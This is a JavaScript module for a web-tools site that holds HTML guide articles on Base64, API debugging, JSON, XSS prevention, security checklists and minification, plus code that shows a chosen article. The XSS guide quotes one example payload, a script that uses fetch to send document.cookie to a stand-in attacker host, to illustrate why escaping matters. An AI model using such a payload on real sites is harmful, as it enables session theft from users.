// --- Guides Content & Logic ---
import { switchView } from './utils.js';

const guidesData = {
    'base64': {
        title: 'Understanding Base64 Encoding',
        content: `
            <p>Base64 is a binary-to-text encoding scheme that represents binary data in an ASCII string format. It's one of the most common ways to transmit binary data over protocols that are designed to handle text, such as HTTP, SMTP, or even embedding data directly into HTML and CSS.</p>
            
            <h2>How Base64 Works</h2>
            <p>The term "Base64" comes from the fact that it uses a set of 64 unique characters to represent data. These characters typically include:</p>
            <ul>
                <li>Uppercase letters (A-Z)</li>
                <li>Lowercase letters (a-z)</li>
                <li>Numbers (0-9)</li>
                <li>Two additional symbols (usually + and /)</li>
                <li>The = character is used for padding at the end of the string</li>
            </ul>
            <p>Every three bytes of binary data (24 bits) are divided into four 6-bit chunks. Each 6-bit chunk is then mapped to one of the 64 characters in the Base64 alphabet.</p>

            <blockquote>
                Important: Base64 is <strong>NOT encryption</strong>. It is a form of encoding. Anyone can easily decode a Base64 string back to its original binary form. Never use it to secure sensitive information like passwords.
            </blockquote>

            <h2>Common Use Cases in Web Development</h2>
            <ol>
                <li><strong>Data URIs:</strong> Embedding small images directly into HTML or CSS using <code>data:image/png;base64,...</code>. This reduces the number of HTTP requests.</li>
                <li><strong>Basic Authentication:</strong> Transmitting credentials in HTTP headers (though this should always be done over HTTPS).</li>
                <li><strong>Email Attachments:</strong> Legacy email systems often handle only 7-bit ASCII, so binary attachments must be encoded.</li>
                <li><strong>JSON Payloads:</strong> Including binary data (like a small profile picture) inside a JSON object.</li>
            </ol>

            <h2>Performance Trade-offs</h2>
            <p>While Base64 is convenient, it comes with a cost. Encoding data into Base64 increases the file size by approximately <strong>33%</strong>. For large files, this overhead can significantly impact load times and bandwidth usage. As a rule of thumb, only use Base64 for very small assets (icons, small logos) or when necessary for protocol compatibility.</p>
        `
    },
    'api-debugging': {
        title: 'REST API Debugging Best Practices',
        content: `
            <p>Debugging APIs is a core skill for modern web developers. When a request fails, the cause can range from a simple typo in the URL to complex authentication issues or server-side crashes.</p>
            
            <h2>1. Master the Status Codes</h2>
            <p>HTTP status codes are the first line of communication from the server. Understanding them is crucial:</p>
            <ul>
                <li><strong>2xx (Success):</strong> Everything went well. <code>200 OK</code> or <code>201 Created</code> are what you want to see.</li>
                <li><strong>4xx (Client Errors):</strong> The problem is likely in your request. <code>400 Bad Request</code> (malformed JSON), <code>401 Unauthorized</code> (missing token), or <code>404 Not Found</code>.</li>
                <li><strong>5xx (Server Errors):</strong> The server failed to fulfill a valid request. <code>500 Internal Server Error</code> often means a crash in the backend code.</li>
            </ul>

            <h2>2. Inspect Request & Response Headers</h2>
            <p>Headers contain metadata that can explain why a request is failing. Check for:</p>
            <ul>
                <li><code>Content-Type</code>: Are you sending <code>application/json</code>?</li>
                <li><code>Authorization</code>: Is your Bearer token correctly formatted?</li>
                <li><code>CORS Headers</code>: Is the server allowing requests from your domain?</li>
            </ul>

            <h2>3. Use the Right Tools</h2>
            <p>While <code>console.log</code> is a start, specialized tools provide much more insight. The Network tab in your browser's Developer Tools is your best friend. For more complex testing, use a dedicated suite like Parse Utils or a desktop client.</p>

            <blockquote>
                Pro Tip: Always test your API calls in an isolated environment before integrating them into your application logic. This helps you determine if a bug is in the API or in your UI code.
            </blockquote>
        `
    },
    'json': {
        title: 'JSON: The Backbone of the Modern Web',
        content: `
            <p>JSON (JavaScript Object Notation) has become the de facto standard for data exchange on the web, largely replacing XML due to its simplicity and native support in JavaScript.</p>
            
            <h2>Why JSON Won</h2>
            <p>JSON is lightweight, easy for humans to read and write, and incredibly easy for machines to parse. Because it maps directly to JavaScript objects, web developers can work with it seamlessly without complex transformation logic.</p>

            <h2>Common Syntax Pitfalls</h2>
            <p>JSON is stricter than standard JavaScript objects. Common errors include:</p>
            <ul>
                <li><strong>Single Quotes:</strong> JSON requires double quotes for keys and string values.</li>
                <li><strong>Trailing Commas:</strong> The last item in an object or array must not have a comma.</li>
                <li><strong>Invalid Types:</strong> JSON only supports strings, numbers, booleans, null, objects, and arrays. Functions or Dates are not supported directly.</li>
            </ul>

            <pre><code>// Correct JSON
{
  "user": "Jane Doe",
  "active": true,
  "roles": ["admin", "editor"]
}</code></pre>

            <h2>Minification vs. Beautification</h2>
            <p>For production, JSON is often "minified"—removing all whitespace to save bytes. For development and debugging, "beautifying" or "prettifying" it (adding indentation) is essential for readability. Our <strong>JSON Parser</strong> tool handles both effortlessly.</p>
        `
    },
    'xss': {
        title: 'HTML Escaping & XSS Prevention',
        content: `
            <p>Cross-Site Scripting (XSS) remains one of the most common vulnerabilities in web applications. It occurs when an application includes untrusted data in a web page without proper validation or escaping.</p>
            
            <h2>What is HTML Escaping?</h2>
            <p>Escaping is the process of converting potentially dangerous characters into their "safe" HTML entity equivalents. This ensures the browser treats them as literal text rather than executable code.</p>
            <ul>
                <li><code>&lt;</code> becomes <code>&amp;lt;</code></li>
                <li><code>&gt;</code> becomes <code>&amp;gt;</code></li>
                <li><code>&amp;</code> becomes <code>&amp;amp;</code></li>
                <li><code>"</code> becomes <code>&amp;quot;</code></li>
            </ul>

            <h2>A Typical Attack Scenario</h2>
            <p>Imagine a comment section that displays user input directly. An attacker could post a comment like: <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code>. Without escaping, every user who views that comment would have their session cookies sent to the attacker.</p>

            <blockquote>
                Rule #1 of Web Security: Never trust user input. Always escape data on the server side before storing it, and again on the client side before rendering it.
            </blockquote>

            <h2>Modern Defenses</h2>
            <p>While manual escaping is important, modern frameworks often provide automatic escaping. Additionally, implementing a strong <strong>Content Security Policy (CSP)</strong> can prevent unauthorized scripts from running even if an XSS vulnerability exists.</p>
        `
    },
    'security-checklist': {
        title: 'Web Security Checklist for 2026',
        content: `
            <p>Security is not a one-time setup; it's a continuous process. As we move through 2026, the threat landscape continues to evolve. Use this checklist to ensure your web applications are following current best practices.</p>
            
            <h2>1. Transport Layer Security</h2>
            <ul>
                <li>[ ] Use HTTPS everywhere (no exceptions).</li>
                <li>[ ] Implement HSTS (HTTP Strict Transport Security) headers.</li>
                <li>[ ] Use secure, HttpOnly, and SameSite attributes for all cookies.</li>
            </ul>

            <h2>2. Content & Injection Protection</h2>
            <ul>
                <li>[ ] Escape all user-generated content before rendering (XSS protection).</li>
                <li>[ ] Implement a strict Content Security Policy (CSP).</li>
                <li>[ ] Use parameterized queries for all database interactions (SQL Injection protection).</li>
            </ul>

            <h2>3. Client-Side Integrity</h2>
            <ul>
                <li>[ ] Use Subresource Integrity (SRI) for all third-party scripts and styles.</li>
                <li>[ ] Minimize third-party dependencies and audit them regularly.</li>
                <li>[ ] Implement proper rate limiting and input validation on your APIs.</li>
            </ul>

            <h2>4. Authentication & Authorization</h2>
            <ul>
                <li>[ ] Enforce strong password policies and MFA (Multi-Factor Authentication).</li>
                <li>[ ] Use modern standards like OAuth 2.1 or OpenID Connect.</li>
                <li>[ ] Regularly rotate API keys and secrets.</li>
            </ul>
        `
    },
    'optimization': {
        title: 'Minification vs. Compression',
        content: `
            <p>In the quest for a faster web, two terms are often confused: Minification and Compression. While both aim to reduce file sizes, they work in completely different ways and should be used together for maximum effect.</p>
            
            <h2>Minification: The Structural Cleanup</h2>
            <p>Minification is the process of removing unnecessary characters from source code without changing its functionality. This includes:</p>
            <ul>
                <li>Removing whitespace, newlines, and tabs.</li>
                <li>Stripping out comments.</li>
                <li>Shortening variable names (mangling).</li>
            </ul>
            <p>Minification happens <strong>build-time</strong>. It makes the code harder for humans to read but smaller for browsers to download.</p>

            <h2>Compression: The Network Squeeze</h2>
            <p>Compression (like Gzip or Brotli) happens at the <strong>server-level</strong> during the transmission of the file. It uses algorithms to find repeating patterns in the data and represent them more efficiently. Once the file reaches the browser, it is automatically decompressed.</p>

            <h2>The Synergy</h2>
            <p>For the best performance, you should use both. Minifying your JavaScript and CSS files before deploying them ensures the baseline size is as small as possible. Then, your web server (like Nginx or Apache) should be configured to compress those files on the fly. This "double-whammy" can often reduce asset sizes by 70% or more.</p>
        `
    }
};

export function setupGuides() {
    const guideCards = document.querySelectorAll('.guide-card');
    const articleView = document.getElementById('article-view');
    const fullArticleContent = document.getElementById('full-article-content');
    const backBtn = document.getElementById('btn-back-to-guides');
    const allViews = document.querySelectorAll('.view');
    const navLinks = document.querySelectorAll('.nav-link');

    guideCards.forEach(card => {
        const readMoreBtn = card.querySelector('.btn-read-more');
        if (readMoreBtn) {
            readMoreBtn.addEventListener('click', () => {
                const articleId = card.getAttribute('data-article');
                const articleData = guidesData[articleId];
                
                if (articleData) {
                    injectArticle(articleData);
                    switchView('article-view', allViews, navLinks);
                }
            });
        }
    });

    backBtn.addEventListener('click', () => {
        switchView('guides-view', allViews, navLinks);
    });
}

function injectArticle(data) {
    const content = document.getElementById('full-article-content');
    content.innerHTML = `
        <h1>${data.title}</h1>
        <div class="article-body">
            ${data.content}
        </div>
    `;
}
